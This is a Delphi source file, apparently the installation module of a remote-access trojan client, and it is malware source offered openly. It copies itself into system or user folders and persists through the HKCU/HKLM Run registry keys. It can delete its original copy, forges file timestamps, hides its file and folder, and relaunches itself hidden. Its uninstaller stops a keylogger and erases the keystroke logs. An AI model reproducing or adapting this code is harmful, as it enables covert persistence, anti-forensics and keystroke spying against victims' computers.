unit UnitInstallation; //by wrh1d3

interface

uses
  Windows, SysUtils, UnitUtils, UnitConfiguration, UnitRegistryManager, UnitKeylogger,
  UnitFilesManager;
          
const
  HKCURun = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\';
  HKLMRun = 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\';

function InstallClient: string;
procedure UninstallClient; 
procedure CreateStartupValue(Filename: string);

implementation

uses
  UnitConnection;

procedure CreateStartupValue(Filename: string);
begin
  if Configuration.HKCU then AddRegValue(HKCURun, Configuration.RegValue, 'REG_SZ', Filename);
  if Configuration.HKLM then AddRegValue(HKLMRun, Configuration.RegValue, 'REG_SZ', Filename);
end;

function InstallClient: string;
var
  Destination, TmpPath: string;
begin
  Result := ParamStr(0);

  //first get destination path
  if Configuration.Destination = '%WINDOWS%' then Destination := WinDir else
  if Configuration.Destination = '%SYSTEM32%' then Destination := SysDir else
  if Configuration.Destination = '%TEMP%' then Destination := TmpDir else
  if Configuration.Destination = '%ROOT%' then Destination := RootDir else
  if Configuration.Destination = '%APPDATA%' then Destination := AppDataDir else
  begin
    Exit;

    //if a custom destination path is set as option in client builder,
    //so we can try to create the entire path...

    {if Destination[Length(Destination)] <> '\' then Destination := Destination + '\';
    if CreatePath(Destination) = False then Destination := AppDir; //create the entire path}
  end;

  //installation path will check at each client file execution so if file is already installed
  //on the first execution there's no reason to continue process on next execution...
  TmpPath := Destination + Configuration.FolderName;
  if DirectoryExists(TmpPath) then Exit; //file is already installed in destination
  if CreateDir(TmpPath) = False then Exit;
  TmpPath := TmpPath + '\' + Configuration.FileName;

  //first tentative, maybe the destination path needs admin rights
  if CopyFile(PChar(ParamStr(0)), PChar(TmpPath), False) = True then Result := TmpPath else
  begin
    Result := ParamStr(0);

    TmpPath := TmpDir + Configuration.FolderName; //so install in temp dir by default
    if DirectoryExists(TmpPath) then Exit;
    if CreateDir(TmpPath) = False then Exit;
    TmpPath := TmpPath + '\' + Configuration.FileName;
    
    if CopyFile(PChar(ParamStr(0)), PChar(TmpPath), False) = True then  Result := TmpPath else
      Result := ParamStr(0);
  end;

  //add installation file path to startup
  if Configuration.Startup then CreateStartupValue(Result);

  if Result <> ParamStr(0) then //only for the installed file
  if Configuration.Melt then MySelfDelete;
                                                 
  if Result <> ParamStr(0) then //only for the installed file
  if Configuration.CreationTime then //change file and folder creation time (random time)
  begin
    ChangeFileTime(Result);
    ChangeDirTime(ExtractFilePath(Result));
  end;

  if Result <> ParamStr(0) then //only for the installed file
  if Configuration.Hide then
  begin
    HideFileName(Result); //hide both file and folder               
    HideFileName(ExtractFilePath(Result));
  end;

  //start installed client 
  MyShellExecute(Result, '', SW_HIDE);
  ExitProcess(0); //if not the second file will not execute if there's a process mutex
end;

procedure UninstallClient; //clear file, folder and logs from computer
begin
  if Configuration.Startup then //registry startup is independant of installation
  begin
    if Configuration.HKCU then DelRegValue(HKCURun, Configuration.RegValue);
    if Configuration.HKLM then DelRegValue(HKLMRun, Configuration.RegValue);
  end;

  if Configuration.Keylogger then
  begin
    StopKeylogger; //stop keylogger
    DeleteAllFilesAndDir(LogsDir);
  end;

  MySelfDelete; //delete files and folder from client file own process
  if Configuration.Install = True then MySelfDeleteFolder; //i'm sure that you will understand

  //stop running
  ExitProcess(0);

  //i swear that i was not there! ;)
end;

end.
